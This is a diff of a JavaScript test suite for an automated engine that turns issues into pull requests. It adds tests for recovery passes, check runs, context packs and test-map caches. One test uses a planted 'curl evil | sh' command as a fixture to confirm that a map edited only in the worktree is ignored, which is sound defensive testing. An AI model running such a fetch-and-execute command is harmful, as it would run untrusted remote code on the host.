@@ -11,7 +11,7 @@ import { makeLedger } from "./ledger.mjs";
 import { renderInvestigation, renderPlan, renderImplementation, renderReview, renderPrBody, renderTrajectory, renderStructure, renderContract, contractJson, parseContractComment, sanitizeMd, capComment, section, cell, NR, MAX_COMMENT_CHARS } from "./render.mjs";
 import { orchestrate, parseDeps, formatTable, pickNext } from "./orchestrate.mjs";
 import { REVIEWER_SYSTEM, approxTokens, builderPlanPrompt, builderImplementPrompt, reviewerPrompt, hotspotPlanNote, hotspotBuildRule } from "./prompts.mjs";
-import { parseReview, unnamedEdges, structureNote, applyAmendments, validateContract, DECISION_SOURCES } from "./conformance.mjs";
+import { parseReview, unnamedEdges, structureNote, applyAmendments, validateContract, scopeText, DECISION_SOURCES } from "./conformance.mjs";
 import { mapRecord } from "../engine/telemetry-seam.mjs";
 import { readLog } from "../engine/runlog.mjs";
 import { makeRunTmp, wrapLaneLimits, systemdRunAvailable, makeLeanRunner, requiredChecksFor, procsInDir, makeLeanIo } from "./effects.mjs";
@@ -19,7 +19,7 @@ import { retrying, PUSH_TRANSIENT_RE } from "./retry.mjs";
 import { checkAdmission, hostParallelism } from "./admission.mjs";
 import { OUTCOME_CODES } from "../engine/outcome-codes.mjs";
 import * as refactorMod from "./refactor.mjs";
-import { readAdmission, readConformanceMode, readReviewIncomplete, readEnvConfig } from "../engine-cli.mjs";
+import { readAdmission, readConformanceMode, readReviewIncomplete, readEnvConfig, readContextPack } from "../engine-cli.mjs";
 import { prepareToolchain } from "./toolchain.mjs";
 import { runFromCli, orchestrateFromCli, ENGINE_PATHS, readMaintenance } from "../engine-cli.mjs";
 // orchestrateFromCli opens the host lane registry (#4191): keep it in a temp dir.
@@ -123,6 +123,7 @@ function world(o = {}) {
       if (a[0] === "diff") return "diff --git a/src/foo.js b/src/foo.js\n+fix";
       if (a[0] === "ls-remote" && String(a.at(-1)).startsWith("refs/heads/")) { const b = a.at(-1).slice("refs/heads/".length); return (o.branchesOnOrigin ?? ["staging", "main"]).includes(b) ? `abc\trefs/heads/${b}\n` : ""; }
       if (a[0] === "ls-remote") return w.remote;
+      if (a[0] === "show" && w.baseFiles) { if (!(a[1] in w.baseFiles)) throw new Error(`fatal: path not in ${a[1]}`); return w.baseFiles[a[1]]; }
       if (a[0] === "push") w.seq.push("push");
       return "";
     },
@@ -183,7 +184,7 @@ describe("core work-on", () => {
     assert.match(w.comments[1], /^<!-- FORGE:INVESTIGATION -->\n<!-- FORGE:VALIDATE -->\n## Investigation Report\n\*\*Verdict\*\*: CONFIRMED/);
     assert.match(w.comments[2], /^<!-- FORGE:CONTRACT -->\n<!-- FORGE:PLAN -->\n## Builder Contract \(frozen `[0-9a-f]{12}`\)/, "PLAN stays as an alias marker");
     assert.match(w.comments[2], /\| R1 \| foo must handle a null argument without throwing\. \| deliver \|/);
-    assert.match(w.comments[2], /<summary>contract\.json \(sha256 [0-9a-f]{12}\)<\/summary>/);
+    assert.match(w.comments[2], /<summary>contract\.json \(sha256 [0-9a-f]{12}, issue [0-9a-f]{12}\)<\/summary>/);
     assert.match(w.comments[3], /## Implementation Complete\n\*\*Branch:\*\* `feat\/issue-7-lean`\n\*\*Files changed:\*\*\n- `src\/foo.js`\n- `test\/foo.test.js`/);
     assert.match(w.comments[4], /## Conformance Review\n\*\*Verdict:\*\* CONFORMS/);
     assert.match(w.comments[4], /\| R1 \| implemented \| src\/foo.js:3 \| V1 \|/);
@@ -287,7 +288,7 @@ describe("core work-on", () => {
     assert.equal(w.prs.length, 1);
     assert.equal(traj(w).length, 1);
     assert.match(traj(w)[0], /2 round\(s\)/);
-    assert.match(traj(w)[0], /Not conforming \(review\): conformance\.unimplemented; builder resumed once/);
+    assert.match(traj(w)[0], /Not conforming \(review\): conformance\.unimplemented \(R1 partial: .*\("foo must handle a null argument without throwing\."\)\); builder resumed once/);
     assert.equal(w.comments.filter((c) => c.includes("FORGE:IMPLEMENTATION")).length, 1, "one implementation note");
     assert.equal(w.patches.length, 1, "edited in place after the resume");
     assert.match(w.patches[0].join(" "), /-X PATCH repos\/o\/r\/issues\/comments\/\d+ -f body=<!-- FORGE:IMPLEMENTATION -->/);
@@ -701,6 +702,91 @@ describe("issue edited mid-run (#4188)", () => {
     assert.equal((await run(w, { dir })).terminalReason, "merged");
     assert.equal(readLog(dir, 7).filter((e) => e.event === "ISSUE_EDITED").length, 0);
   });
+
+  it("#4265 the engine's own FORGE:STATE write to the body is not an issue edit", async () => {
+    const dir = tmpDir("issue-engine-edit-");
+    const state = `${ISSUE_BODY}\n\n<!-- FORGE:STATE\n{"v":1,"issue":7,"lease":{"by":"core_1","until":1}}\n-->`;
+    const w = world({ issueBodies: [ISSUE_BODY, state, `${state.replace("until\":1", "until\":2")}`] });
+    assert.equal((await run(w, { dir })).terminalReason, "merged");
+    assert.equal(readLog(dir, 7).filter((e) => e.event === "ISSUE_EDITED").length, 0);
+    assert.doesNotMatch(traj(w).at(-1), /Issue edited during the run/);
+  });
+});
+
+describe("in-batch recovery of mechanical needs-human (#4267)", () => {
+  const BODY_B = "foo now also needs a bar mode.\n\n- foo must accept a bar flag and return bar output.\n- Existing callers of foo keep working.";
+
+  it("runCore --recover: removes needs-human, posts FORGE:DECISION, and tells the builder what to recover", async () => {
+    const w = world();
+    const r = await run(w, { recover: { code: "ci.red", attempt: 1 } });
+    assert.equal(r.terminalReason, "merged");
+    assert.ok(w.edits.some((e) => e.join(" ") === "issue edit 7 -R o/r --remove-label needs-human"));
+    const dec = w.comments.find((c) => c.startsWith("<!-- FORGE:DECISION -->"));
+    assert.match(dec, /recovery pass for `ci\.red`/); assert.match(dec, /\*\*Why\*\*/); assert.match(dec, /\*\*Alternative\*\*/);
+    assert.ok(builders(w).some((b) => /Recovery pass \(ci\.red\): .*--log-failed/.test(b[4])));
+    const w2 = world();
+    await run(w2, { recover: { code: "builder.block_untyped", attempt: 1 } });
+    assert.ok(builders(w2).some((b) => /pick the option most consistent with the issue, the repo's conventions and prior merged decisions/.test(b[4])));
+    const w3 = world();
+    await run(w3);
+    assert.ok(!w3.comments.some((c) => c.includes("FORGE:DECISION")), "no recovery: nothing changes");
+    assert.ok(!builders(w3).some((b) => /Recovery pass/.test(b[4])));
+  });
+
+  it("runCore marks a contract.invalid after a mid-run issue edit (issueEdited) and a failed recovery pass (recovery)", async () => {
+    const bad1 = { ...CONTRACT, requirements: [{ id: "R1", quote: "make foo nicer", disposition: "deliver" }] };
+    const r = await run(world({ contract: bad1, fixedContract: bad1, issueBodies: [ISSUE_BODY, BODY_B] }), { recover: { code: "contract.invalid", attempt: 1 } });
+    assert.equal(r.code, "contract.invalid"); assert.equal(r.issueEdited, true); assert.equal(r.recovery, true);
+    const r2 = await run(world({ contract: bad1, fixedContract: bad1 }));
+    assert.equal(r2.code, "contract.invalid"); assert.equal(r2.issueEdited, undefined); assert.equal(r2.recovery, undefined);
+  });
+
+  it("a recovery lane puts needs-human back once, with evidence, only on a final failure (ci-pending / needs-human); never on invalid, decomposed, merged, deferred, engine-error (#4297, SPEC-7/8)", async () => {
+    const add = (w) => w.edits.filter((e) => e.join(" ") === "issue edit 7 -R o/r --add-label needs-human").length;
+    const nh = (w) => w.comments.filter((c) => c.startsWith("<!-- FORGE:NEEDS_HUMAN -->"));
+    const ends = {
+      "ci-pending": [{ waits: Array(500).fill({ rc: 2, text: "" }) }, { ciMaxMinutes: 10, mergeWait: "all" }],
+      "needs-human": [{ waits: [{ rc: 1, text: "lint failed" }] }, { mergeWait: "all" }],
+    };
+    for (const [reason, [wo, ro]] of Object.entries(ends)) {
+      const w = world(wo);
+      assert.equal((await run(w, { recover: { code: "ci.red", attempt: 1 }, ...ro })).terminalReason, reason);
+      assert.equal(add(w), 1, `${reason}: needs-human re-applied once`);
+      assert.equal(nh(w).length, 1, reason);
+      assert.match(nh(w)[0], new RegExp(`Recovery pass for \`ci\\.red\` \\(attempt 1\\) did not merge: it ended \`${reason}\``), reason);
+    }
+    // SPEC-7/8: invalid and decomposed are legitimate endings; deferred/engine-error/dependency-open may be requeued by the runner.
+    // The lane itself never relabels them.
+    const limitErr = Object.assign(new Error("claude CLI exited with status 1. You've hit your session limit"), { code: "CLI_BACKEND_FAILED", usageLimit: true, resetAtEpochMs: 3 * 3600 * 1000 });
+    const failBuilder = (w, err) => { const orig = w.io.runner; let n = 0; w.io.runner = async (c) => { if (c.role === "builder" && n++ < 1) throw err; return orig(c); }; return w; };
+    const withDeps = (w, deps) => {
+      const gh = w.io.gh;
+      w.io.gh = async (x) => {
+        if (x[0] === "issue" && x[1] === "view" && deps[x[2]]) return JSON.stringify(deps[x[2]]);
+        if (x[0] === "issue" && x[1] === "create") return "https://github.com/o/r/issues/201\n";
+        return gh(x);
+      };
+      return w;
+    };
+    const quiet = {
+      invalid: () => world({ changed: [], result: { status: "invalid", summary: "not a bug", evidence: ["src/foo.js:3 already guards null"], tests: [] } }),
+      decomposed: () => withDeps(world({ changed: [], result: { status: "blocked", summary: "epic", block: { kind: "split-required", subissues: [{ title: "part A", body: "do A" }] } } }), {}),
+      "dependency-open": () => withDeps(world({ changed: [], result: { status: "blocked", summary: "needs #3", block: { kind: "dependency", issues: ["#3"] } } }), { 3: { state: "OPEN", labels: [] } }),
+      "engine-error": () => failBuilder(world(), new Error("boom")),
+      deferred: () => failBuilder(world(), limitErr),
+    };
+    for (const [reason, mk] of Object.entries(quiet)) {
+      const w = mk();
+      assert.equal((await run(w, { recover: { code: "ci.red", attempt: 1 } })).terminalReason, reason);
+      assert.equal(add(w), 0, `${reason}: no needs-human relabel`); assert.equal(nh(w).length, 0, `${reason}: no FORGE:NEEDS_HUMAN`);
+    }
+    const m = world();
+    assert.equal((await run(m, { recover: { code: "ci.red", attempt: 1 } })).terminalReason, "merged");
+    assert.equal(add(m), 0); assert.equal(nh(m).length, 0);
+    const plain = world(ends["ci-pending"][0]);
+    assert.equal((await run(plain, ends["ci-pending"][1])).terminalReason, "ci-pending");
+    assert.equal(add(plain), 0, "no recovery: a ci-pending run is not labelled");
+  });
 });
 
 describe("devdocs freshness gate (the repo's own scripts/check-devdocs-freshness.sh)", () => {
@@ -918,8 +1004,23 @@ describe("conformance shadow mode (the default)", () => {
     const r = await runShadow(w);
     assert.equal(r.code, "conformance.unimplemented"); assert.equal(w.merges.length, 0);
     assert.equal(builders(w).length, 3, "plan + implement + one resume"); assert.equal(reviewers(w).length, 0);
-    assert.match(builders(w)[2][4], /validate V1 failed \(exit 1\)/);
-    assert.match(nhBody(w), /validate V1 failed \(exit 1\)/);
+    assert.match(builders(w)[2][4], /validate V1 \(`node --test test\/foo\.test\.js`\) failed \(exit 1\)/);
+    assert.match(nhBody(w), /validate V1 \(`node --test test\/foo\.test\.js`\) failed \(exit 1\)/);
+  });
+
+  it("a failed validate fetches the lane and the resume says how to catch up with a moved base (merge, never rebase)", async () => {
+    const w = world({ validation: [{ id: "V1", command: "node --test test/foo.test.js", exit: 1 }], resumeValidation: [{ id: "V1", command: "node --test test/foo.test.js", exit: 0 }] });
+    assert.equal((await runShadow(w)).terminalReason, "merged");
+    const p = builders(w)[2][4];
+    assert.match(p, /origin\/staging moved on[\s\S]*git merge --no-edit origin\/staging[\s\S]*never rebase or force/);
+    const fetches = w.calls.filter((c) => c[0] === "git" && c[1] === "fetch" && c[2] === "origin" && c[3] === "staging");
+    assert.ok(fetches.length >= 2, "fetched at setup and again before the resume");
+  });
+
+  it("a resume for other failures (a partial requirement) does not mention merging the base", async () => {
+    const w = world({ claims: [{ id: "R1", status: "partial" }] });
+    await runShadow(w);
+    assert.doesNotMatch(builders(w)[2][4], /git merge --no-edit/);
   });
 
   it("shadow: a failed validate fixed by the resume merges", async () => {
@@ -932,6 +1033,15 @@ describe("conformance shadow mode (the default)", () => {
     const r = await runShadow(w);
     assert.equal(r.code, "conformance.unimplemented"); assert.equal(w.merges.length, 0); assert.equal(builders(w).length, 3);
     assert.match(nhBody(w), /R1 reported "partial"/);
+    assert.match(nhBody(w), /R1 reported "partial" \("foo must handle a null argument without throwing\."\)/, "#4265: names the unmet requirement");
+    assert.match(traj(w)[0], /Not conforming \(precheck\): conformance\.unimplemented \(R1 reported "partial" \("foo must handle/);
+  });
+
+  it("#4265 a validate step failing after the resume names its command in the needs-human", async () => {
+    const v = [{ id: "V1", command: "node --test test/foo.test.js", exit: 1 }];
+    const w = world({ validation: v, resumeValidation: v });
+    assert.equal((await runShadow(w)).code, "conformance.unimplemented");
+    assert.match(nhBody(w), /validate V1 \(`node --test test\/foo\.test\.js`\) failed \(exit 1\)/);
   });
 
   it("#4160 shadow blocks a validate step with no recorded result and an invalid amendment like a reviewer-found unimplemented requirement", async () => {
@@ -2746,6 +2856,27 @@ describe("batch robustness (#4112-#4115)", () => {
     assert.ok(!w.comments.some((c) => c.includes("FORGE:CONTRACT")), "not re-posted");
     assert.match(traj(w)[0], /frozen contract [0-9a-f]{12} recovered from the issue/);
   });
+  const scoped = (body = ISSUE_BODY) => contractHash(scopeText({ title: "foo breaks", body: `${body}\n\n<!-- FORGE:STATE {"v":1} -->` }, []));
+  it("#4265 a rerun recovers a contract frozen from the current issue scope (engine annotations aside)", async () => {
+    const c = frozenComment(CONTRACT, (b) => b.replace(/\(sha256 ([0-9a-f]{12})\)/, `(sha256 $1, issue ${scoped()})`));
+    const w = world({ prList: [], remote: "abc\trefs/heads/feat/issue-7-lean", issueComments: [c] });
+    assert.equal((await run(w)).terminalReason, "merged");
+    assert.equal(builders(w).length, 1);
+    assert.match(traj(w)[0], /frozen contract [0-9a-f]{12} recovered from the issue/);
+  });
+  it("#4265 a rerun after the issue scope changed re-plans and freezes a new contract with the current scope hash", async () => {
+    const dir = tmpDir("contract-stale-");
+    const old = frozenComment(CONTRACT, (b) => b.replace(/\(sha256 ([0-9a-f]{12})\)/, `(sha256 $1, issue ${scoped("foo crashes; old scope.")})`));
+    const human = { body: "Also: foo must log the null input.", author_association: "OWNER", user: { type: "User", login: "op" } };
+    for (const [comments, reason] of [[[old], /issue scope [0-9a-f]{12} -> [0-9a-f]{12}/], [[frozenComment(), human], /a human comment was posted after it/]]) {
+      const w = world({ prList: [], remote: "abc\trefs/heads/feat/issue-7-lean", issueComments: comments });
+      assert.equal((await run(w, { dir })).terminalReason, "merged");
+      assert.match(builders(w)[0][4], /PLANNING ONLY[\s\S]*This is a rerun/);
+      assert.match(traj(w)[0], reason);
+      assert.match(w.comments.find((x) => x.includes("<!-- FORGE:CONTRACT -->")), /\(sha256 [0-9a-f]{12}, issue [0-9a-f]{12}\)/);
+    }
+    assert.equal(readLog(dir, 7).filter((e) => e.event === "CONTRACT_STALE").length, 2);
+  });
   it("a tampered or untrusted contract comment is ignored: the rerun plans again", async () => {
     for (const c of [frozenComment(CONTRACT, (b) => b.replaceAll("guard null", "guard nothing")), frozenComment(CONTRACT, (b) => b, "NONE")]) {
       const w = world({ prList: [], remote: "abc\trefs/heads/feat/issue-7-lean", issueComments: [c] });
@@ -3041,7 +3172,7 @@ describe("verify-by-CI (#4167): ci mode runs the heavy checks on CI and feeds fa
     writeFileSync(`${d}/forge.yaml`, "engine:\n  conformance: shadow\n");
     assert.equal(readVerify(d), undefined);
     writeFileSync(`${d}/forge.yaml`, "verify:\n  mode: ci\n  workflow: verify.yml\n  skip_paths: \"*.md,docs/**\"\n  max_rounds: 3\n  precheck_timeout_seconds: 60\n");
-    assert.deepEqual(readVerify(d), { mode: "ci", workflow: "verify.yml", pathsInput: null, skipPaths: ["*.md", "docs/**"], maxRounds: 3, precheckTimeoutSeconds: 60 });
+    assert.deepEqual(readVerify(d), { mode: "ci", workflow: "verify.yml", pathsInput: null, skipPaths: ["*.md", "docs/**"], maxRounds: 3, precheckTimeoutSeconds: 60, checkRun: false });
   });
 });
 
@@ -3405,6 +3536,85 @@ describe("local-mode CI fix rounds at merge and declared pre-PR check commands (
   });
 });
 
+describe("test map and repo facts caches (#4272)", () => {
+  const MAPF = "origin/staging:.forge/test-map.json", FACTSF = `${WT}/.forge/repo-facts.json`;
+  const map = (entries) => JSON.stringify({ version: 1, entries });
+  const recorder = (w) => { const ran = []; w.io.runCommand = async ({ command }) => { ran.push(command); return { rc: 0, output: "" }; }; return ran; };
+
+  it("a test map present picks the commands for the changed files instead of learned.test_commands", async () => {
+    const w = world(); const ran = recorder(w); w.baseFiles = {};
+    w.baseFiles[MAPF] = map([{ globs: ["src/**/*.js"], command: "npm run lint", cwd: ".", source: "package.json#scripts.lint" },
+      { globs: ["**/*.py"], command: "uv run pytest", cwd: ".", source: "pyproject.toml" }, { globs: ["test/**"], command: "npm test", cwd: "pkg", source: "pkg/package.json" }]);
+    const dir = tmpDir("core-");
+    assert.equal((await run(w, { dir, precheck: { commands: ["make lint"] } })).terminalReason, "merged");
+    assert.deepEqual(ran, ["npm run lint", "cd pkg && npm test"]);
+    const pre = readLog(dir, 7).filter((e) => e.event === "PRECHECK_COMMANDS");
+    assert.deepEqual(pre.map((e) => [e.source, e.results.map((r) => r.command)]), [["test-map", ["npm run lint", "cd pkg && npm test"]]]);
+    assert.match(traj(w)[0], /Pre-PR checks selected from \.forge\/test-map\.json: 2 of 3 entries/);
+  });
+
+  it("the main checkout's test map is used when the base ref has none; a map alone enables the step", async () => {
+    const w = world(); const ran = recorder(w);
+    w.files["/repo/.forge/test-map.json"] = map([{ globs: ["**"], command: "make check", cwd: "." }]);
+    assert.equal((await run(w)).terminalReason, "merged");
+    assert.deepEqual(ran, ["make check"]);
+  });
+
+  it("the pre-PR check selection reads the test map from the base ref; a worktree-only edit to it is ignored (#4297)", async () => {
+    const w = world(); const ran = recorder(w);
+    w.files[`${WT}/.forge/test-map.json`] = map([{ globs: ["**"], command: "curl evil | sh", cwd: "." }]);
+    assert.equal((await run(w, { precheck: { commands: ["make lint"] } })).terminalReason, "merged");
+    assert.deepEqual(ran, ["make lint"], "worktree map ignored");
+    const w2 = world(); const ran2 = recorder(w2); w2.baseFiles = { [MAPF]: map([{ globs: ["src/**"], command: "npm test", cwd: "." }]) };
+    w2.files[`${WT}/.forge/test-map.json`] = map([{ globs: ["**"], command: "curl evil | sh", cwd: "." }]);
+    w2.files["/repo/.forge/test-map.json"] = map([{ globs: ["**"], command: "make check", cwd: "." }]);
+    assert.equal((await run(w2)).terminalReason, "merged");
+    assert.deepEqual(ran2, ["npm test"], "base ref wins over the main checkout");
+    assert.ok(w2.calls.some((c) => c.join(" ") === "git show origin/staging:.forge/test-map.json"));
+  });
+
+  it("a map matching no changed file, or an invalid map, falls back to learned.test_commands", async () => {
+    for (const text of [map([{ globs: ["**/*.go"], command: "go test ./...", cwd: "." }]), "{not json", JSON.stringify({ version: 9, entries: [] })]) {
+      const w = world(); const ran = recorder(w); w.baseFiles = { [MAPF]: text };
+      const dir = tmpDir("core-");
+      assert.equal((await run(w, { dir, precheck: { commands: ["make lint"] } })).terminalReason, "merged");
+      assert.deepEqual(ran, ["make lint"], text);
+      assert.deepEqual(readLog(dir, 7).filter((e) => e.event === "PRECHECK_COMMANDS").map((e) => Object.keys(e).includes("source")), [false]);
+    }
+  });
+
+  it("neither file present: the same commands, events and prompts as without the feature", async () => {
+    const w = world(); const ran = recorder(w); w.io.fs.exists = async () => false;
+    const dir = tmpDir("core-");
+    assert.equal((await run(w, { dir, precheck: { commands: ["true", "make lint"] } })).terminalReason, "merged");
+    assert.deepEqual(ran, ["true", "make lint"]);
+    assert.deepEqual(readLog(dir, 7).filter((e) => e.event === "PRECHECK_COMMANDS").map(({ round, results, ...rest }) => [round, results, Object.keys(rest).filter((k) => k === "source")]),
+      [[0, [{ command: "true", rc: 0 }, { command: "make lint", rc: 0 }], []]]);
+    const [plan, impl] = builders(w);
+    assert.equal(plan[4].startsWith(builderPlanPrompt(7)), true); assert.equal(impl[4].startsWith(builderImplementPrompt("local")), true);
+    for (const b of builders(w)) assert.doesNotMatch(b[4], /Repo facts/);
+    assert.doesNotMatch(traj(w)[0], /test-map/);
+  });
+
+  it("repo-facts.json present: the builder prompts cite its path, never its content", async () => {
+    const w = world(); recorder(w);
+    w.files[FACTSF] = JSON.stringify({ version: 1, toolchain: { pm: { name: "pnpm", version: "9.9.9-SECRET" } } });
+    w.io.fs.exists = async (p) => p in w.files;
+    assert.equal((await run(w)).terminalReason, "merged");
+    const [plan, impl] = builders(w);
+    for (const b of [plan, impl]) { assert.ok(b[4].includes(`are cached in ${FACTSF}`)); assert.doesNotMatch(b[4], /9\.9\.9-SECRET/); }
+    const w2 = world(); recorder(w2); w2.files["/repo/.forge/repo-facts.json"] = "{}"; w2.io.fs.exists = async (p) => p in w2.files;
+    assert.equal((await run(w2)).terminalReason, "merged");
+    assert.ok(builders(w2)[0][4].includes("are cached in /repo/.forge/repo-facts.json"));
+  });
+
+  it("prompts are byte-identical without a facts path", () => {
+    assert.equal(builderPlanPrompt(7, { toolchain: null, facts: null }), builderPlanPrompt(7));
+    assert.equal(builderImplementPrompt("ci", { facts: null }), builderImplementPrompt("ci"));
+    assert.match(builderImplementPrompt("local", { facts: "/x/.forge/repo-facts.json" }), /Repo facts \(toolchain pins, slow suites, layer rules, hotspots\) are cached in \/x\/\.forge\/repo-facts\.json/);
+  });
+});
+
 describe("toolchain pins and env.setup at lane setup (#4163)", () => {
   /** Real detection over the fake worktree files; shim writes are recorded, npx is the only launcher on the fake host. */
   const pinned = (w, files, { node = "v26.7.0" } = {}) => {
@@ -3630,6 +3840,202 @@ describe("hybrid placement in the lane's FORGE annotation (#4256)", () => {
     assert.equal(r2.seen.placement, undefined);
     const r3 = await quiet(() => runFromCli(["7", "--repo", "o/r"], deps()));
     assert.equal(r3.seen.placement, undefined);
+  });
+});
+
+describe("verify.check_run: forgedock/verify check run (#4270)", () => {
+  const withChecks = (o = {}, fail = null) => {
+    const w = world(o);
+    w.checkRuns = [];
+    w.io.createCheckRun = async (c) => { w.checkRuns.push(c); if (fail) throw new Error(fail); return { id: w.checkRuns.length, html_url: `https://github.com/o/r/runs/${w.checkRuns.length}` }; };
+    return w;
+  };
+  const on = { verify: { mode: "local", checkRun: true } };
+  const strip = (evs) => evs.map(({ ts, ...e }) => e);
+
+  it("posts one success check run on the pushed PR head with per-gate typed output and a VERIFY event", async () => {
+    const dir = tmpDir("vcr-");
+    const w = withChecks();
+    const r = await run(w, { dir, ...on });
+    assert.equal(r.terminalReason, "merged");
+    assert.equal(w.checkRuns.length, 1);
+    const c = w.checkRuns[0];
+    assert.equal(c.name, "forgedock/verify");
+    assert.equal(c.sha, w.head);
+    assert.equal(c.conclusion, "success");
+    const out = JSON.parse(/```json\n([\s\S]*)\n```/.exec(c.text)[1]);
+    assert.deepEqual(out.gates.map((g) => g.id), ["precheck.commands", "structure.edges", "docs.freshness", "conformance.scope", "conformance.validate", "conformance.requirements", "maintenance.hotspot_growth", "conformance.amendments"]);
+    assert.ok(out.gates.every((g) => g.ok === true));
+    assert.deepEqual(out.gates.find((g) => g.id === "conformance.validate").evidence, [{ id: "V1", command: "node --test test/foo.test.js", exit: 0 }]);
+    const v = readLog(dir, 7).filter((e) => e.event === "VERIFY");
+    assert.equal(v.length, 1);
+    assert.equal(v[0].head, w.head); assert.equal(v[0].conclusion, "success"); assert.equal(v[0].posted, true);
+    assert.ok(readLog(dir, 7).findIndex((e) => e.event === "PR_OPENED") < readLog(dir, 7).findIndex((e) => e.event === "VERIFY"), "after the PR head is pushed");
+  });
+
+  it("reports failure iff an existing gate failed (shadow scope creep), without changing the lane outcome", async () => {
+    const w = withChecks({ changed: ["src/foo.js", "test/foo.test.js", "src/extra.js"] });
+    const base = world({ changed: ["src/foo.js", "test/foo.test.js", "src/extra.js"] });
+    const r = await run(w, { conformance: "shadow", ...on });
+    assert.equal(r.terminalReason, (await run(base, { conformance: "shadow" })).terminalReason);
+    assert.equal(w.checkRuns.length, 1);
+    assert.equal(w.checkRuns[0].conclusion, "failure");
+    const out = JSON.parse(/```json\n([\s\S]*)\n```/.exec(w.checkRuns[0].text)[1]);
+    const scope = out.gates.find((g) => g.id === "conformance.scope");
+    assert.equal(scope.ok, false); assert.match(scope.evidence[0], /src\/extra\.js/);
+    assert.ok(out.gates.filter((g) => g.id !== "conformance.scope").every((g) => g.ok));
+  });
+
+  it("posts once per pushed head: a base-sync that moves the head gets its own check run", async () => {
+    const w = withChecks({ prView: [{ mergeable: "CONFLICTING", mergeStateStatus: "DIRTY" }, { mergeable: "MERGEABLE", mergeStateStatus: "CLEAN" }], mergeResults: ["clean"] });
+    assert.equal((await run(w, on)).terminalReason, "merged");
+    assert.equal(w.checkRuns.length, 2);
+    assert.match(w.checkRuns[0].sha, /^bbbb/, "the reviewed PR head");
+    assert.match(w.checkRuns[1].sha, /^cccc/, "the base-synced head");
+    assert.equal(w.checkRuns[1].sha, w.head);
+  });
+
+  it("with the flag unset no Checks API call is made and the run log is identical (golden comparison)", async () => {
+    const runs = [];
+    for (const extra of [{}, { verify: { mode: "local" } }, { verify: { mode: "local", checkRun: false } }]) {
+      const dir = tmpDir("vcr-off-");
+      const w = withChecks();
+      const r = await run(w, { dir, ...extra });
+      assert.equal(w.checkRuns.length, 0);
+      runs.push({ reason: r.terminalReason, log: strip(readLog(dir, 7)), waits: w.calls.length });
+    }
+    assert.ok(!runs[0].log.some((e) => e.event === "VERIFY"));
+    assert.deepEqual(runs[1], runs[0]); assert.deepEqual(runs[2], runs[0]);
+    // the same lane without the seam at all: the golden reference
+    const dir = tmpDir("vcr-ref-");
+    const ref = world();
+    const rr = await run(ref, { dir });
+    assert.deepEqual({ reason: rr.terminalReason, log: strip(readLog(dir, 7)) }, { reason: runs[0].reason, log: runs[0].log });
+  });
+
+  it("merge policy all: the lane's own check is ignored by the CI wait only when the flag is on", async () => {
+    const seen = [];
+    for (const extra of [{}, on]) {
+      const w = withChecks();
+      w.io.waitCiGreen = async (...a) => { seen.push(a); return { rc: 0, text: `CI_GATE_HEAD: ${w.head}` }; };
+      assert.equal((await run(w, { mergeWait: "all", ...extra })).terminalReason, "merged");
+    }
+    assert.equal(seen[0].length, 3, "flag off: the 3-argument call is unchanged");
+    assert.deepEqual(seen.at(-1)[3], { ignore: ["forgedock/verify"] });
+  });
+
+  it("a Checks API failure never fails the lane: recorded as an anomaly and a VERIFY event with posted false", async () => {
+    const dir = tmpDir("vcr-fail-");
+    const w = withChecks({}, "HTTP 403: Resource not accessible by integration");
+    const r = await run(w, { dir, ...on });
+    assert.equal(r.terminalReason, "merged");
+    assert.equal(w.checkRuns.length, 1);
+    const v = readLog(dir, 7).find((e) => e.event === "VERIFY");
+    assert.equal(v.posted, false); assert.match(v.error, /403/);
+    assert.match(traj(w).at(-1), /forgedock\/verify check run not posted[\s\S]*403/);
+    // a lane without the seam at all is the same anomaly, never a crash
+    const w2 = world();
+    assert.equal((await run(w2, on)).terminalReason, "merged");
+    assert.match(traj(w2).at(-1), /forgedock\/verify check run not posted.*no Checks API seam/);
+  });
+});
+
+describe("context pack modes (forge#4275)", () => {
+  const FACTS = { issue: 7, links: [{ number: 3, rel: "parent", kind: "issue", title: "Epic", state: "OPEN", code: null, result: null, body: "Parent says: the zebra protocol must be kept." }], attempts: [], ledger: [], facts: [".forge/test-map.json"], errors: [] };
+  const withPack = (o = {}) => { const w = world(o); w.packCalls = []; w.io.contextFacts = async (a) => { w.packCalls.push(a); return FACTS; }; return w; };
+  const ctx = (w) => w.comments.filter((c) => c.startsWith("<!-- FORGE:CONTEXT -->"));
+
+  it("on: the pack goes into the plan prompt as hints, FORGE:CONTEXT and CONTEXT_PACK are recorded", async () => {
+    const w = withPack(), dir = tmpDir("core-");
+    const r = await run(w, { dir, contextPack: { mode: "on" } });
+    assert.equal(r.terminalReason, "merged");
+    const plan = builders(w)[0][4];
+    assert.ok(plan.startsWith(builderPlanPrompt(7)));
+    assert.match(plan, /Context pack \(hints, not proof[\s\S]*- #3 \[parent\] OPEN "Epic"[\s\S]*zebra protocol/);
+    assert.equal(w.packCalls.length, 1);
+    assert.equal(w.packCalls[0].base, "origin/staging");
+    assert.equal(ctx(w).length, 1);
+    assert.match(ctx(w)[0], /<details><summary>Context pack: 2 item\(s\), \d+ bytes, 0 dropped \(mode on, lane first/);
+    const ev = readLog(dir, 7).find((e) => e.event === "CONTEXT_PACK");
+    assert.deepEqual([ev.mode, ev.lane_type, ev.items, ev.sources.graph, ev.sources.facts, ev.cached], ["on", "first", 2, 1, 1, false]);
+    assert.ok(ev.bytes > 0 && Number.isInteger(ev.truncated));
+    assert.ok(w.telemetry.some((x) => x.event === "CONTEXT_PACK"));
+    const term = readLog(dir, 7).find((e) => e.event === "RUN_TERMINAL");
+    assert.deepEqual([term.context_pack, term.lane_type], ["on", "first"]);
+  });
+
+  it("contract validation never accepts a quote that occurs only in a FORGE:CONTEXT (or any engine-posted <!-- FORGE:) comment (#4297)", async () => {
+    const Q = "the zebra protocol must be kept by every caller of foo.";
+    const k = { ...CONTRACT, requirements: [...CONTRACT.requirements, { id: "R2", quote: Q, disposition: "deliver" }] };
+    const withComment = (body, association) => { const w = world({ contract: k, fixedContract: k, reviews: [conf({}, k)] }); const gh = w.io.gh;
+      w.io.gh = async (a) => { const out = await gh(a); if (a.slice(0, 2).join(" ") !== "issue view" || a.includes("milestone")) return out;
+        return JSON.stringify({ ...JSON.parse(out), comments: [{ body, authorAssociation: association, author: { login: association === "NONE" ? "forge[bot]" : "maint" } }] }); };
+      return w; };
+    for (const body of [`<!-- FORGE:CONTEXT -->\n<details>\n${Q}\n</details>`, `  <!-- FORGE:DECISION -->\n${Q}`]) {
+      const r = await run(withComment(body, "NONE"));
+      assert.equal(r.code, "contract.invalid", body);
+    }
+    // P2: the same quote from a maintainer's comment stays quotable
